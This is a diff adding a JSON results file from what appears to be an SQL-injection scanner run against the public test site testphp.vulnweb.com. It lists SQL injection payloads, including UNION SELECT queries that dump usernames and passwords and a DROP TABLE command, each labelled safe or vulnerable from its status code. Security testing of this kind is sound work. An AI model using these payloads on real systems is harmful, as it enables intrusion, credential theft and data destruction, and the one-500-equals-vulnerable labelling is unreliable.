@@ -1,0 +1,95 @@
+{
+    "results": [
+        {
+            "payload": "' OR 1=1 --",
+            "status": "safe",
+            "url": "http://testphp.vulnweb.com/ ?input=' OR 1=1 --",
+            "status_code": 404,
+            "response_snippet": "<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n"
+        },
+        {
+            "payload": "' OR 'a'='a",
+            "status": "safe",
+            "url": "http://testphp.vulnweb.com/ ?input=' OR 'a'='a",
+            "status_code": 404,
+            "response_snippet": "<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n"
+        },
+        {
+            "payload": "' UNION SELECT NULL, username, password FROM users --",
+            "status": "safe",
+            "url": "http://testphp.vulnweb.com/ ?input=' UNION SELECT NULL, username, password FROM users --",
+            "status_code": 404,
+            "response_snippet": "<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n"
+        },
+        {
+            "payload": "'; DROP TABLE users --",
+            "status": "safe",
+            "url": "http://testphp.vulnweb.com/ ?input='; DROP TABLE users --",
+            "status_code": 404,
+            "response_snippet": "<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n"
+        },
+        {
+            "payload": "1' OR '1'='1",
+            "status": "vulnerable",
+            "url": "http://testphp.vulnweb.com/ ?input=1' OR '1'='1",
+            "status_code": 500,
+            "response_snippet": "<html>\r\n<head><title>500 Internal Server Error</title></head>\r\n<body>\r\n<center><h1>500 Internal Serv"
+        },
+        {
+            "payload": "admin'--",
+            "status": "safe",
+            "url": "http://testphp.vulnweb.com/ ?input=admin'--",
+            "status_code": 404,
+            "response_snippet": "<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n"
+        },
+        {
+            "payload": "' OR EXISTS(SELECT 1 FROM users WHERE username='admin') --",
+            "status": "safe",
+            "url": "http://testphp.vulnweb.com/ ?input=' OR EXISTS(SELECT 1 FROM users WHERE username='admin') --",
+            "status_code": 404,
+            "response_snippet": "<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n"
+        },
+        {
+            "payload": "' AND 1=CONVERT(int, '1') --",
+            "status": "safe",
+            "url": "http://testphp.vulnweb.com/ ?input=' AND 1=CONVERT(int, '1') --",
+            "status_code": 404,
+            "response_snippet": "<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n"
+        },
+        {
+            "payload": "1' AND SLEEP(5) --",
+            "status": "safe",
+            "url": "http://testphp.vulnweb.com/ ?input=1' AND SLEEP(5) --",
+            "status_code": 404,
+            "response_snippet": "<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n"
+        },
+        {
+            "payload": "' UNION SELECT table_name, NULL, NULL FROM information_schema.tables --",
+            "status": "safe",
+            "url": "http://testphp.vulnweb.com/ ?input=' UNION SELECT table_name, NULL, NULL FROM information_schema.tables --",
+            "status_code": 404,
+            "response_snippet": "<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n"
+        },
+        {
+            "payload": "' UNION SELECT NULL, group_concat(username, ':', password) FROM users --",
+            "status": "safe",
+            "url": "http://testphp.vulnweb.com/ ?input=' UNION SELECT NULL, group_concat(username, ':', password) FROM users --",
+            "status_code": 404,
+            "response_snippet": "<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n"
+        },
+        {
+            "payload": "' OR 1=1 LIMIT 1,1 --",
+            "status": "safe",
+            "url": "http://testphp.vulnweb.com/ ?input=' OR 1=1 LIMIT 1,1 --",
+            "status_code": 404,
+            "response_snippet": "<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n"
+        },
+        {
+            "payload": "' AND 1=1 UNION SELECT 1,2,3 --",
+            "status": "safe",
+            "url": "http://testphp.vulnweb.com/ ?input=' AND 1=1 UNION SELECT 1,2,3 --",
+            "status_code": 404,
+            "response_snippet": "<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n"
+        }
+    ]
+}
